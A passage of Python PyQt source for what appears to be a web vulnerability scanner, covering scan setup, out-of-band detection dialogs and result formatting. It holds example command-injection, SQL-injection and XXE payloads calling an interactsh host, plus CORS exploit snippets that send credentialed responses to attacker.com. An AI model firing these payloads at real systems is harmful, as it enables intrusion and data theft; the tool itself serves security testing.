        scan_cors   = self.cors_checkbox.isChecked()
        scan_open_redirect = self.open_redirect_checkbox.isChecked()
        scan_ssti   = self.ssti_checkbox.isChecked()
        
        if not any([scan_xss, scan_sqli, scan_lfi, scan_cmdi, scan_idor, scan_upload, scan_ssrf, scan_xxe, scan_nosqli, scan_cors, scan_open_redirect, scan_ssti]):
            QMessageBox.warning(self, "No Scan Type", "Please select at least one scan type")
            return

        active = []
        if scan_xss:    active.append("XSS")
        if scan_sqli:   active.append("SQLi")
        if scan_lfi:    active.append("LFI")
        if scan_cmdi:   active.append("CMDi")
        if scan_idor:   active.append("IDOR")
        if scan_upload: active.append("Upload")
        if scan_ssrf:   active.append("SSRF")
        if scan_xxe:    active.append("XXE")
        if scan_nosqli: active.append("NoSQLi")
        if scan_cors:   active.append("CORS")
        if scan_open_redirect: active.append("OpenRedirect")
        if scan_ssti:   active.append("SSTI")
        
        if len(active) == 1:
            scan_type = active[0]
        elif active == ["XSS", "SQLi"]:
            scan_type = "Both"
        elif set(active) == {"XSS", "SQLi", "LFI", "CMDi", "IDOR", "Upload", "SSRF", "XXE", "NoSQLi", "CORS", "OpenRedirect", "SSTI"}:
            scan_type = "All"
        else:
            # Multi-scan: encode as comma-joined string handled in run()
            scan_type = ",".join(active)
        
        boost_mode = self.boost_mode_checkbox.isChecked()
        
        # ── CMDi / SQLi OAST Configuration ──
        oast_url = None
        needs_oast = scan_cmdi or scan_sqli or scan_ssrf or scan_xxe
        if needs_oast:
            # Build title based on which scans need OAST
            oast_scan_names = []
            if scan_cmdi: oast_scan_names.append("OS Command Injection (CMDi)")
            if scan_sqli: oast_scan_names.append("SQL Injection (SQLi)")
            if scan_ssrf: oast_scan_names.append("Server-Side Request Forgery (SSRF)")
            if scan_xxe:  oast_scan_names.append("XML External Entity (XXE)")
            oast_title_str = " & ".join(oast_scan_names)

            # Show configuration dialog for OAST
            dialog = QDialog(self)
            dialog.setWindowTitle("Out-of-Band (OAST) Configuration — Interactsh")
            dialog.setMinimumWidth(560)
            layout = QVBoxLayout(dialog)
            layout.setSpacing(8)

            title_lbl = QLabel(f"⌕ Blind OAST Detection — {oast_title_str}")
            title_font = QFont()
            title_font.setBold(True)
            title_lbl.setFont(title_font)
            layout.addWidget(title_lbl)

            layout.addWidget(QLabel(
                "This technique detects blind vulnerabilities by making the target server\n"
                "issue DNS lookups to a unique interactsh subdomain you control.\n"
                "If the server is vulnerable, the DNS interaction appears in interactsh.\n\n"
                "OAST covers:\n"
                + ("  • CMDi: nslookup, curl, wget, certutil, PowerShell\n" if scan_cmdi else "")
                + ("  • SQLi: MSSQL xp_dirtree, MySQL LOAD_FILE, Oracle UTL_HTTP/UTL_INADDR,\n"
                   "          PostgreSQL COPY TO PROGRAM / dblink\n" if scan_sqli else "")
                + ("  • XXE:  blind regular entity, % parameter entities,\n"
                   "          out-of-band DTD exfiltration (phases 3–5)\n" if scan_xxe else "")
            ))

            sep = QFrame()
            sep.setFrameShape(QFrame.HLine)
            sep.setFrameShadow(QFrame.Sunken)
            layout.addWidget(sep)

            layout.addWidget(QLabel("Steps:"))
            layout.addWidget(QLabel("  1. Open https://app.interactsh.com/ in your browser."))
            layout.addWidget(QLabel("  2. Click 'Copy' to copy your unique interaction hostname,\n"
                                    "     e.g.  kgji2ohoyw.oast.fun"))
            layout.addWidget(QLabel("  3. Paste it below (hostname only — no https://)."))

            link_btn = QPushButton(" Open app.interactsh.com")
            link_btn.clicked.connect(lambda: QDesktopServices.openUrl(QUrl("https://app.interactsh.com/")))
            layout.addWidget(link_btn)

            layout.addWidget(QLabel("Your interactsh hostname:"))
            url_input = QLineEdit()
            url_input.setPlaceholderText("e.g.  kgji2ohoyw.oast.fun")
            layout.addWidget(url_input)

            example_lines = ["Example payloads that will be fired:"]
            if scan_cmdi:
                example_lines += [
                    "  [CMDi] & nslookup kgji2ohoyw.oast.fun &",
                    "  [CMDi] & nslookup `whoami`.kgji2ohoyw.oast.fun &",
                    "  [CMDi] & nslookup %USERNAME%.kgji2ohoyw.oast.fun &",
                ]
            if scan_sqli:
                example_lines += [
                    "  [SQLi] '; EXEC master..xp_dirtree '//kgji2ohoyw.oast.fun/a'--",
                    "  [SQLi] ' AND LOAD_FILE(CONCAT('\\\\\\\\','kgji2ohoyw.oast.fun','\\\\a'))--",
                    "  [SQLi] ' AND UTL_INADDR.get_host_address('kgji2ohoyw.oast.fun')--",
                ]
            if scan_ssrf:
                example_lines += [
                    "  [SSRF] http://kgji2ohoyw.oast.fun/ssrf-probe",
                    "  [SSRF] http://ssrf-probe.kgji2ohoyw.oast.fun/",
                ]
            if scan_xxe:
                example_lines += [
                    "  [XXE]  <!ENTITY % xxe SYSTEM \"http://kgji2ohoyw.oast.fun\"> %xxe;",
                    "  [XXE]  <!ENTITY xxe SYSTEM \"http://kgji2ohoyw.oast.fun/xxe-p3-productId\">",
                    "  [XXE]  <!ENTITY % xxe SYSTEM \"http://kgji2ohoyw.oast.fun/malicious.dtd\"> %xxe;",
                ]
            layout.addWidget(QLabel("\n".join(example_lines)))

            btns = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
            btns.button(QDialogButtonBox.Ok).setText("Start With OAST Scan")
            btns.button(QDialogButtonBox.Cancel).setText("Skip OAST")
            btns.accepted.connect(dialog.accept)
            btns.rejected.connect(dialog.reject)
            layout.addWidget(btns)

            if dialog.exec_() == QDialog.Accepted:
                oast_url = url_input.text().strip()

                # ── Upload Scan Configuration ──
        upload_base_url = None
        target_langs = []
        if scan_upload:
            # Get the request to be scanned to extract filename
            row = min(selected_rows)
            request_data = self.scan_queue[row]
            request_text = request_data.get("request_text", "")
            
            # Extract original filename from Content-Disposition
            match = re.search(r'filename="([^"]+)"', request_text)
            original_filename = match.group(1) if match else "unknown"
            
            # Show configuration dialog
            dialog = QDialog(self)
            dialog.setWindowTitle("Upload Scan Configuration")
            dialog.setMinimumWidth(400)
            layout = QVBoxLayout(dialog)
            
            # Language Selection
            lang_group = QGroupBox("Target Backend Language(s)")
            lang_layout = QGridLayout()
            
            chk_php = QCheckBox("PHP")
            chk_asp = QCheckBox("ASP.NET")
            chk_jsp = QCheckBox("JSP")
            chk_python = QCheckBox("Python")
            chk_node = QCheckBox("Node.js")
            chk_ruby = QCheckBox("Ruby")
            chk_shell = QCheckBox("Shell & Scripts")
            
            chk_php.setChecked(True) # Default
            
            lang_layout.addWidget(chk_php, 0, 0)
            lang_layout.addWidget(chk_asp, 0, 1)
            lang_layout.addWidget(chk_jsp, 0, 2)
            lang_layout.addWidget(chk_python, 1, 0)
            lang_layout.addWidget(chk_node, 1, 1)
            lang_layout.addWidget(chk_ruby, 1, 2)
            lang_layout.addWidget(chk_shell, 2, 0)
            
            lang_group.setLayout(lang_layout)
            layout.addWidget(lang_group)
            
            layout.addWidget(QLabel(f"Enter the full URL where the file '{original_filename}' can be accessed after upload:"))
            layout.addWidget(QLabel("(Leave empty or click Skip to disable execution verification)"))
            
            url_input = QLineEdit()
            url_input.setPlaceholderText(f"e.g. https://example.com/uploads/{original_filename}")
            layout.addWidget(url_input)
            
            btns = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
            btns.button(QDialogButtonBox.Ok).setText("Submit")
            btns.button(QDialogButtonBox.Cancel).setText("Skip")
            btns.accepted.connect(dialog.accept)
            btns.rejected.connect(dialog.reject)
            layout.addWidget(btns)
            
            if dialog.exec_() == QDialog.Accepted:
                if chk_php.isChecked(): target_langs.append("PHP")
                if chk_asp.isChecked(): target_langs.append("ASP.NET")
                if chk_jsp.isChecked(): target_langs.append("JSP")
                if chk_python.isChecked(): target_langs.append("Python")
                if chk_node.isChecked(): target_langs.append("Node.js")
                if chk_ruby.isChecked(): target_langs.append("Ruby")
                if chk_shell.isChecked(): target_langs.append("Shell")
                if not target_langs: target_langs = ["PHP"]

                input_url = url_input.text().strip()
                if input_url:
                    # If input ends with the filename, strip it to get the directory
                    if input_url.endswith(original_filename):
                        upload_base_url = input_url[:-len(original_filename)]
                    else:
                        # Otherwise assume it's the directory
                        upload_base_url = input_url if input_url.endswith('/') else input_url + '/'
                    
                    # Add parent directories to traffic filter
                    additional_urls = [upload_base_url]
                    try:
                        parsed = urllib.parse.urlparse(upload_base_url)
                        path = parsed.path
                        if path.endswith('/'):
                            path = path[:-1]
                        
                        while '/' in path and len(path) > 0:
                            path = path.rsplit('/', 1)[0]
                            if not path: path = '/'
                            
                            parent_url = f"{parsed.scheme}://{parsed.netloc}{path}"
                            if not parent_url.endswith('/'):
                                parent_url += '/'
                            
                            if parent_url not in additional_urls:
                                additional_urls.append(parent_url)
                            
                            if path == '/': break
                    except Exception as e:
                        logger.error(f"Error calculating parent URLs: {e}")
                    
                    request_data["additional_urls"] = additional_urls
                    self.additional_filtered_urls = additional_urls

        row = min(selected_rows)
        if row >= len(self.scan_queue):
            return
        
        request_data = self.scan_queue[row]

        # ── Injection Point Selector ──────────────────────────────────────────
        # Show the dialog so the user can see and override which injection points
        # will be tested.  Pre-checks match exactly what the scan would test
        # by default.  Cancel aborts the scan.
        #
        # Skip the dialog entirely when:
        #   a) Upload is the ONLY active scan — it has no parameter-level
        #      injection points (the "injection" IS the file itself).  It
        #      already shows its own dedicated configuration dialog above.
        #   b) No injection points are found in the request at all.
        #
        # When a multipart/form-data request is used alongside other scans
        # (e.g. Upload + LFI), filter the injection points list to exclude
        # the binary file field — it isn't injectable for XSS/SQLi/etc.
        # The remaining points (cookies, headers, URL params) are still shown.

        # Determine whether the request is multipart
        _req_ct = ""
        for _k, _v in request_data.get("headers", {}).items() if request_data.get("headers") else []:
            if _k.lower() == "content-type":
                _req_ct = _v.lower()
                break
        if not _req_ct:
            # Fall back to parsing from request_text
            _req_text_ct = request_data.get("request_text", "")
            _sep_ct = "\r\n\r\n" if "\r\n\r\n" in _req_text_ct else "\n\n"
            for _line in _req_text_ct.split(_sep_ct, 1)[0].split("\n")[1:]:
                _line = _line.rstrip("\r")
                if _line.lower().startswith("content-type:"):
                    _req_ct = _line.split(":", 1)[1].strip().lower()
                    break
        _is_multipart = "multipart/form-data" in _req_ct

        # Non-upload active scans (ones that DO use injection points)
        _non_upload_active = [s for s in active if s not in ("Upload", "WAF", "CORS")]
        _upload_only = len(_non_upload_active) == 0

        _inj_all = _parse_all_injection_points(request_data)
        forced_injection_points: Optional[set] = None   # None = no override

        if _inj_all and not _upload_only:
            # For multipart requests paired with other scans, exclude the
            # binary file field from the dialog — it's not a text injection
            # point for XSS/SQLi/LFI/CMDi/IDOR/SSRF.
            if _is_multipart:
                _inj_all = [
                    p for p in _inj_all
                    if p["type"] not in ("POST Body", "JSON Field")
                ]

            if _inj_all:
                _inj_dlg = InjectionPointSelectorDialog(
                    request_data, _non_upload_active, parent=self,
                    points=_inj_all
                )
                if _inj_dlg.exec_() != QDialog.Accepted:
                    self.scan_status_label.setText("Scan cancelled")
                    return
                selected_ids = _inj_dlg.selected_ids()
                if not selected_ids:
                    QMessageBox.warning(
                        self, "No Points Selected",
                        "No injection points were selected.\n"
                        "Please select at least one point to test."
                    )
                    return
                # Always use exactly what the user confirmed in the dialog.
                forced_injection_points = set(selected_ids)
        # ─────────────────────────────────────────────────────────────────────

        # Capture pre-scan CSRF refresh URL from dialog (empty string → None)
        _csrf_pre_url: Optional[str] = (
            _inj_dlg.csrf_refresh_url
            if "_inj_dlg" in dir()              # dialog shown
            and _inj_dlg.csrf_refresh_url       # non-empty
            else None
        )

        # Mark URL as scanning (orange)
        _url_item = self.queue_table.item(row, 1)
        if _url_item:
            _url_item.setForeground(QBrush(QColor("#ff9800")))

        self.scan_results[row] = ""
        self.scan_logs[row] = ""

        # Reset baseline so the new scan's first Baseline entry sets the reference
        self._baseline_length = None
        self._baseline_time   = None

        self.current_scan_worker = ScanWorker(
            request_data, scan_type, boost_mode,
            upload_base_url=upload_base_url, target_langs=target_langs, oast_url=oast_url,
            scan_timeout=self._scan_timeout,
            scan_req_delay=self._scan_req_delay,
            scan_max_workers=self._scan_max_workers,
            scan_max_retries=self._scan_max_retries,
            scan_follow_redirects=self._scan_follow_redirects,
            scan_verify_ssl=self._scan_verify_ssl,
            scan_stop_on_first=self._scan_stop_on_first,
            scan_bool_consensus=self._scan_bool_consensus,
            scan_time_threshold=self._scan_time_threshold,
        )
        self.current_scan_worker.forced_injection_points = forced_injection_points
        # ── Pre-scan CSRF refresh URL (set in injection-point dialog) ─────────
        if _csrf_pre_url:
            self.current_scan_worker.csrf_refresh_url = _csrf_pre_url
        # ── AI Payload Suggester ──────────────────────────────────────────────
        if self.ai_payloads_checkbox.isChecked():
            self.current_scan_worker.ai_suggest_payloads = True
            self.current_scan_worker.ai_settings = self._load_ai_settings()
        self.current_scan_worker.scan_progress.connect(lambda msg: self.append_log(row, msg))
        self.current_scan_worker.scan_complete.connect(lambda results: self.on_scan_complete(row, results))
        self.current_scan_worker.scan_error.connect(lambda error: self.on_scan_error(row, error))
        self.current_scan_worker.traffic_entry.connect(self.add_traffic_entry)

        # ── CSRF Option C mid-scan dialog ─────────────────────────────────
        # The worker emits csrf_option_c_needed from the scan thread.
        # This slot runs on the UI thread, shows CsrfOptionCDialog, writes the
        # result back into the worker, then sets the threading.Event so the
        # scan thread can proceed.
        def _on_csrf_option_c_needed(csrf_fields: list, upload_url: str):
            dlg = CsrfOptionCDialog(csrf_fields, upload_url, parent=self)
            worker = self.current_scan_worker
            if dlg.exec_() == QDialog.Accepted and dlg.refresh_url:
                worker.csrf_refresh_url = dlg.refresh_url
            else:
                worker._csrf_option_c_skip = True
            worker._csrf_option_c_ready.set()   # unblock the scan thread

        self.current_scan_worker.csrf_option_c_needed.connect(_on_csrf_option_c_needed)

        # ── One-by-one step mode ────────────────────────────────────────────
        if self._scan_step_mode:
            self.current_scan_worker.step_mode = True
            # Wire the worker's step_paused signal to enable the Next button
            self.current_scan_worker.step_paused.connect(self._on_step_paused)
        # ────────────────────────────────────────────────────────────────────

        self.start_scan_btn.setEnabled(False)
        self.stop_scan_btn.setEnabled(True)
        self.progress_bar.setVisible(True)

        if self._scan_step_mode:
            self.step_next_btn.setVisible(True)
            self.step_next_btn.setEnabled(False)   # enabled when first pause fires

        preset_icon = {"fast": "", "normal": "", "slow": "", "step": ""}.get(self._scan_speed_preset, "✓")
        status_msg = f"Scanning #{row + 1}... {preset_icon} {self._scan_speed_preset.capitalize()}"
        if boost_mode:
            status_msg += " | ⚡ BOOST"
        self.scan_status_label.setText(status_msg)

        # Emit config summary as first log line
        cfg_line = (
            f"⚙ Scan Config → Preset: {preset_icon} {self._scan_speed_preset.capitalize()} | "
            f"Timeout: {self._scan_timeout}s | Delay: {self._scan_req_delay}s | "
            f"Workers: {self._scan_max_workers} | Retries: {self._scan_max_retries} | "
            f"Bool consensus: {self._scan_bool_consensus} | "
            f"Time threshold: {self._scan_time_threshold}s | "
            f"Boost: {'ON' if boost_mode else 'OFF'} | "
            f"AI Payloads: {'ON ✨' if self.ai_payloads_checkbox.isChecked() else 'OFF'}"
        )
        self.append_log(row, cfg_line)
        
        self.current_scan_worker.start()
    
    def append_log(self, queue_index: int, message: str):
        """Append log message"""
        if queue_index not in self.scan_logs:
            self.scan_logs[queue_index] = ""
        
        self.scan_logs[queue_index] += message + "\n"
        
        selected = self.queue_table.selectedItems()
        if selected and selected[0].row() == queue_index:
            self.logs_text.setPlainText(self.scan_logs[queue_index])
            self.logs_text.moveCursor(self.logs_text.textCursor().End)
    
    def on_scan_complete(self, queue_index: int, results: Dict[str, Any]):
        """Handle scan completion"""
        results_text = self.format_results(results)
        self.scan_results[queue_index] = results_text
        
        if "error" in results:
            _ui = self.queue_table.item(queue_index, 1)
            if _ui:
                _ui.setForeground(QBrush(QColor("#ef5350")))  # red — error
        else:
            is_vulnerable = False
            if "bypass" in results:
                is_vulnerable = results["bypass"].get("vulnerable", False)
            if "xss" in results:
                is_vulnerable = is_vulnerable or results["xss"].get("vulnerable", False)
            if "sqli" in results:
                is_vulnerable = is_vulnerable or results["sqli"].get("vulnerable", False)
            if "lfi" in results:
                is_vulnerable = is_vulnerable or results["lfi"].get("vulnerable", False)
            if "cmdi" in results:
                is_vulnerable = is_vulnerable or results["cmdi"].get("vulnerable", False)
            if "idor" in results:
                is_vulnerable = is_vulnerable or results["idor"].get("vulnerable", False)
            if "upload" in results:
                is_vulnerable = is_vulnerable or results["upload"].get("vulnerable", False)
            if "ssrf" in results:
                is_vulnerable = is_vulnerable or results["ssrf"].get("vulnerable", False)
            if "xxe" in results:
                is_vulnerable = is_vulnerable or results["xxe"].get("vulnerable", False)
            if "nosqli" in results:
                is_vulnerable = is_vulnerable or results["nosqli"].get("vulnerable", False)
            if "cors" in results:
                is_vulnerable = is_vulnerable or results["cors"].get("vulnerable", False)
            if "open_redirect" in results:
                is_vulnerable = is_vulnerable or results["open_redirect"].get("vulnerable", False)
            if "ssti" in results:
                is_vulnerable = is_vulnerable or results["ssti"].get("vulnerable", False)
            if "vulnerable" in results:
                is_vulnerable = results.get("vulnerable", False)

            _ui = self.queue_table.item(queue_index, 1)
            if _ui:
                if is_vulnerable:
                    _ui.setForeground(QBrush(QColor(COLOR_CRITICAL)))  # red — vulnerable
                else:
                    _ui.setForeground(QBrush(QColor(COLOR_SUCCESS)))   # green — clean
        
        selected = self.queue_table.selectedItems()
        if selected and selected[0].row() == queue_index:
            url = self.scan_queue[queue_index].get("url", "")
            self.results_header.setText(f"Results for: {url}")
            self.results_text.setPlainText(results_text)
        
        self.start_scan_btn.setEnabled(True)
        self.stop_scan_btn.setEnabled(False)
        self.progress_bar.setVisible(False)
        self.step_next_btn.setVisible(False)
        self.step_next_btn.setEnabled(False)
        self.scan_status_label.setText(f"✓ Scan #{queue_index + 1} complete")
        QTimer.singleShot(3000, lambda: self.scan_status_label.setText("Ready"))
    
    def on_scan_error(self, queue_index: int, error: str):
        """Handle scan error"""
        error_msg = f"ERROR: {error}"
        self.scan_results[queue_index] = error_msg
        self.scan_logs[queue_index] += f"\n{error_msg}\n"
        
        _ui = self.queue_table.item(queue_index, 1)
        if _ui:
            _ui.setForeground(QBrush(QColor("#ef5350")))  # red — error

        self.start_scan_btn.setEnabled(True)
        self.stop_scan_btn.setEnabled(False)
        self.progress_bar.setVisible(False)
        self.step_next_btn.setVisible(False)
        self.step_next_btn.setEnabled(False)
        self.scan_status_label.setText(f"✗ Scan #{queue_index + 1} failed")
        QTimer.singleShot(3000, lambda: self.scan_status_label.setText("Ready"))

    def _load_ai_settings(self) -> dict:
        """Return AI settings dict, walking up to the parent GUI if available."""
        try:
            gui = getattr(self, 'parent', None)
            if gui:
                gs = getattr(gui, '_global_settings', None)
                if gs:
                    return gs
        except Exception:
            pass
        _settings_file = os.path.join(
            os.path.expanduser("~"), ".config", "hunt-proxy", "settings.json"
        )
        try:
            if os.path.exists(_settings_file):
                with open(_settings_file, 'r', encoding='utf-8') as fh:
                    return json.load(fh)
        except Exception:
            pass
        return {}
    
    def format_results(self, results: Dict[str, Any]) -> str:
        """Format scan results for display — handles any combination of scan types."""
        lines = []
        lines.append("=" * 80)
        lines.append("⌕ VULNERABILITY SCAN RESULTS")
        lines.append("=" * 80)
        lines.append("")

        # Ordered render: if multiple scans present, emit each section in turn.
        SECTIONS = [
            ("xss",    "=== CROSS-SITE SCRIPTING (XSS) SCAN ===",               "format_xss_results"),
            ("sqli",   "=== SQL INJECTION (SQLi) SCAN ===",                      "format_sqli_results"),
            ("lfi",    "=== LFI / PATH TRAVERSAL SCAN ===",                     "format_lfi_results"),
            ("cmdi",   "=== OS COMMAND INJECTION (CMDi) SCAN ===",              "format_cmdi_results"),
            ("idor",   "=== INSECURE DIRECT OBJECT REFERENCE (IDOR) ===",       "format_idor_results"),
            ("upload", "=== FILE UPLOAD VULNERABILITIES ===",                   "format_upload_results"),
            ("ssrf",   "=== SERVER-SIDE REQUEST FORGERY (SSRF) ===",            "format_ssrf_results"),
            ("xxe",    "=== XML EXTERNAL ENTITY (XXE) INJECTION ===",           "format_xxe_results"),
            ("nosqli", "=== NOSQL INJECTION (NoSQLi) SCAN ===",                 "format_nosqli_results"),
            ("cors",           "=== CORS MISCONFIGURATION SCAN ===",                    "format_cors_results"),
            ("open_redirect",  "=== OPEN REDIRECT SCAN ===",                            "format_open_redirect_results"),
            ("ssti",           "=== SERVER-SIDE TEMPLATE INJECTION (SSTI) SCAN ===",    "format_ssti_results"),
        ]

        multi = any(k in results for k, _, _ in SECTIONS
                    if k != results.get("scan_type"))

        rendered = False
        for key, header, method_name in SECTIONS:
            if key in results:
                if rendered:
                    lines.append("")
                    lines.append("=" * 80)
                    lines.append("")
                lines.append(header)
                lines.append("")
                lines.extend(getattr(self, method_name)(results[key]))
                rendered = True

        # Single-type result dicts (scan_type key instead of nested key)
        if not rendered:
            st = results.get("scan_type", "")
            fmt = {
                "XSS":    "format_xss_results",
                "SQLi":   "format_sqli_results",
                "LFI":    "format_lfi_results",
                "CMDi":   "format_cmdi_results",
                "IDOR":   "format_idor_results",
                "Upload": "format_upload_results",
                "SSRF":   "format_ssrf_results",
                "XXE":    "format_xxe_results",
                "NoSQLi": "format_nosqli_results",
                "CORS":         "format_cors_results",
                "OpenRedirect": "format_open_redirect_results",
                "SSTI":         "format_ssti_results",
            }.get(st)
            if fmt:
                lines.extend(getattr(self, fmt)(results))
            else:
                lines.append(json.dumps(results, indent=2))

        return "\n".join(lines)

    def format_nosqli_results(self, results: dict) -> list:
        """Format NoSQL Injection scan results for display."""
        lines = []

        if not results:
            lines.append("  No results available.")
            return lines

        findings = results.get("findings", [])
        tested   = results.get("total_payloads_tested", 0)
        vuln     = results.get("vulnerable", False)

        lines.append(f"  Total payloads tested : {tested}")
        lines.append(f"  Vulnerable            : {'YES ⚠' if vuln else 'No'}")
        lines.append("")

        if not findings:
            lines.append("  ✓ No NoSQL injection vulnerabilities detected.")
            return lines

        lines.append(f"  ⚠  {len(findings)} finding(s) detected:")
        lines.append("")

        SEVERITY_ORDER = {"Critical": 0, "High": 1, "Medium": 2, "Low": 3, "Info": 4}
        sorted_findings = sorted(
            findings,
            key=lambda f: SEVERITY_ORDER.get(f.get("severity", "Info"), 9)
        )

        for i, f in enumerate(sorted_findings, 1):
            sev   = f.get("severity", "?")
            ftype = f.get("finding_type", "Unknown")
            param = f.get("param", "?")
            ptype = f.get("param_type", "")
            payload = f.get("payload", "")
            desc  = f.get("description", "")
            status = f.get("response_status", "")
            snippet = f.get("response_snippet", "")

            sev_icon = {
                "Critical": "Ⓒ", "High": "Ⓗ", "Medium": "Ⓜ", "Low": "Ⓛ", "Info": "Ⓘ"
            }.get(sev, "•")

            lines.append(f"  [{i}] {sev_icon} [{sev}] {ftype}")
            lines.append(f"       Parameter   : {param}  ({ptype})")
            lines.append(f"       Payload     : {payload[:100]}")
            lines.append(f"       HTTP Status : {status}")
            lines.append(f"       Description : {desc}")
            if snippet:
                # Show a brief response snippet (first 150 chars)
                snip = snippet.replace("\\n", " ").replace("\\r", "")[:150]
                lines.append(f"       Response    : {snip}...")
            lines.append("")

        return lines

    def format_cors_results(self, result: Dict[str, Any]) -> List[str]:
            """Format CORS misconfiguration scan results."""
            import textwrap
            lines = []

            if not result:
                lines.append("  No results available.")
                return lines

            if "error" in result and not result.get("details"):
                lines.append(f"  ✗ Error: {result['error']}")
                return lines

            vulnerable = result.get("vulnerable", False)
            summary    = result.get("summary", "")
            stats      = result.get("stats", {})

            lines.append(f"  Status  : {'⚠  MISCONFIGURED' if vulnerable else '✓ NOT VULNERABLE'}")
            lines.append(f"  Summary : {summary}")
            lines.append(
                f"  Stats   : {stats.get('probes_sent', 0)} probe(s) sent | "
                f"{stats.get('hits', 0)} hit(s) | "
                f"Auth-only: {stats.get('authenticated_hits', 0)}"
            )
            lines.append("")

            if not vulnerable:
                lines.append("  ✓ All CORS probes returned safe responses.")
                lines.append("")
                lines.append("  Attack classes tested:")
                for entry in [
                    "[A] Reflected arbitrary origin         TC-01, TC-19, TC-20, TC-23, TC-24",
                    "[B] Whitelist bypass (suffix/prefix)   TC-02, TC-03, TC-16, TC-17, TC-18",
                    "[B] Fused hostname bypass              TC-FUSE-01, TC-FUSE-02, TC-FUSE-03",
                    "[B] Underscore bypass                  TC-UNDER-01, TC-UNDER-02",
                    "[B] Regex first-dot bypass             TC-REGEX-FIRST",
                    "[B] Space/tab in origin                TC-SPACE-01 to TC-SPACE-03",
                    "[B] Percent-encoded chars              TC-PCT-01 to TC-PCT-05",
                    "[B] Slash/@ path confusion             TC-SLASH-01/02, TC-AT-01/02",
                    "[C] Null origin whitelisted            TC-04, PF-null",
                    "[D] XSS-via-CORS-trust chain           TC-XSS-01 to TC-XSS-05",
                    "[E] Breaking TLS (HTTP subdomain)      TC-TLS-01 to TC-TLS-05",
                    "[E] HTTP same-host on HTTPS            TC-HTTP-SAMEHOST",
                    "[F] Intranet / private IP              TC-PRIV-01 to TC-PRIV-07",
                    "[G] Localhost / loopback               TC-10 to TC-13",
                    "[H] Scheme / port variations           TC-14, TC-15, TC-21 to TC-23",
                    "[#6] Method-switch bypass              TC-MSWITCH-* (GET<->POST)",
                    "[I] OPTIONS preflight                  PF-evil.com, PF-null, PF-sub.*",
                    "[P] Passive (wildcard/3rd-party/bad)   TC-PASSIVE",
                ]:
                    lines.append(f"    {entry}")
                return lines

            details = result.get("details", [])

            _CONF_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
            sorted_details = sorted(
                details,
                key=lambda d: _CONF_ORDER.get(
                    d.get("severity", d.get("confidence", "LOW")), 9
                )
            )

            lines.append(f"  ⚠  {len(sorted_details)} finding(s):")
            lines.append("")

            for i, d in enumerate(sorted_details, 1):
                sev         = d.get("severity", d.get("confidence", "?"))
                sev_icon    = {
                    "CRITICAL": "Ⓒ", "HIGH": "Ⓗ", "MEDIUM": "Ⓜ", "LOW": "Ⓛ"
                }.get(sev, "•")
                tc          = d.get("test_case", "?")
                desc        = d.get("description", "")
                origin      = d.get("origin_sent", "")
                acao        = d.get("acao", "")
                acac        = d.get("acac", "")
                acam        = d.get("acam", "")
                acah        = d.get("acah", "")
                vary        = d.get("vary", "")
                status      = d.get("status_code", "")
                evidence    = d.get("evidence", "")
                repro       = d.get("repro_curl", "")
                url         = d.get("url", "")
                auth_sent   = d.get("auth_sent", False)
                score       = d.get("severity_score", "")
                remediation = d.get("remediation", "")
                oclass      = d.get("origin_class", "")
                with_creds  = (acac == "true")
                is_wildcard = (acao == "*")

                lines.append(f"  {'─' * 68}")
                lines.append(
                    f"  [{i}] {sev_icon} [{sev}]"
                    + (f"  score={score}/10" if score else "")
                    + f"  {tc}"
                )
                lines.append(f"  {'─' * 68}")
                lines.append(f"       Description : {desc}")
                lines.append(f"       Origin Sent : {origin}")
                lines.append(f"       ACAO        : {acao if acao else '(not present)'}")
                lines.append(f"       ACAC        : {acac if acac else '(not present)'}")
                if acam:
                    lines.append(f"       ACAM        : {acam}")
                if acah:
                    lines.append(f"       ACAH        : {acah}")
                lines.append(f"       Vary        : {vary if vary else '(not present)'}")
                lines.append(f"       HTTP Status : {status}")
                lines.append(f"       Auth Sent   : {'Yes (cookie/auth forwarded)' if auth_sent else 'No'}")
                lines.append(f"       Evidence    : {evidence}")
                lines.append(f"       URL         : {url}")
                lines.append("")

                # ── Repro curl ────────────────────────────────────────────────
                if repro:
                    lines.append(f"       ⚡ Repro (curl):")
                    lines.append(f"       {repro}")
                lines.append("")

                # ── Exploit snippets (credentialed or wildcard findings only) ─
                if with_creds or is_wildcard:
                    attacker_origin = origin if origin != "null" else "https://attacker.com"
                    log_host        = "attacker.com"

                    # Use the method from the finding, fall back to GET
                    method_str = (acam or "").split(",")[0].strip()
                    if method_str not in ("GET", "POST", "PUT", "DELETE", "PATCH"):
                        method_str = "GET"

                    # ── Exploit 1: Standalone XHR ─────────────────────────────
                    xhr_lines = [
                        "var req = new XMLHttpRequest();",
                        "req.onload = reqListener;",
                        f"req.open('{method_str.lower()}', '{url}', true);",
                        "req.withCredentials = true;",
                        "req.send();",
                        "function reqListener() {",
                        f"    location = '//{log_host}/log?key=' + this.responseText;",
                        "}",
                    ]

                    # ── Exploit 2: iframe sandbox ─────────────────────────────
                    # Build the raw HTML that goes inside the data: URI
                    iframe_html_raw = (
                        "<script>\n"
                        "var req = new XMLHttpRequest();\n"
                        "req.onload = reqListener;\n"
                        f"req.open('{method_str.lower()}', '{url}', true);\n"
                        "req.withCredentials = true;\n"
                        "req.send();\n"
                        "function reqListener() {\n"
                        f"    location = 'https://{log_host}/log?key=' + this.responseText;\n"
                        "}\n"
                        "</script>"
                    )

                    # URL-encode the inner HTML for the data: URI src attribute.
                    # Every character that could break the HTML attribute or the
                    # data: URI must be percent-encoded.
                    _encode_map = {
                        " ":  "%20",
                        "\n": "%0A",
                        "<":  "%3C",
                        ">":  "%3E",
                        '"':  "%22",
                        "'":  "%27",
                        "{":  "%7B",
                        "}":  "%7D",
                        "#":  "%23",
                        "&":  "%26",
                        "=":  "%3D",
                        "+":  "%2B",
                    }
                    iframe_html_encoded = iframe_html_raw
                    for _char, _enc in _encode_map.items():
                        iframe_html_encoded = iframe_html_encoded.replace(_char, _enc)

                    iframe_exploit_encoded = (
                        '<iframe sandbox="allow-scripts allow-top-navigation allow-forms" '
                        f'src="data:text/html,{iframe_html_encoded}"></iframe>'
                    )

                    # Readable version for display (not for execution)
                    iframe_exploit_readable = (
                        '<iframe sandbox="allow-scripts allow-top-navigation allow-forms"\n'
                        '  src="data:text/html,\n'
                        f'    {iframe_html_raw.strip()}\n'
                        '  ">\n'
                        '</iframe>'
                    )

                    # XSS-chain specific exploit hint
                    if oclass == "xss_chain":
                        lines.append(
